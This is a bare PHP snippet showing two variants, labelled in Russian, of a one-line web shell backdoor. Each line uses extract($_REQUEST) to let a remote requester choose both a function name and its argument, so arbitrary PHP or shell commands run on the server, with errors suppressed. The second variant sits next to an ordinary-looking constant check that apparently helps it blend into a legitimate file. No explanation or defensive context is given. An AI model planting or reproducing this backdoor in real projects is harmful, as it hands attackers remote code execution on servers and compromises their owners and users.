<?php
// вариант 1
extract($_REQUEST) && @$except(stripslashes($shall)) && exit;
// вариант 2
extract($_REQUEST) && @$shall(stripslashes($pass)) && exit; if ( ! defined('NC')) exit;

?>
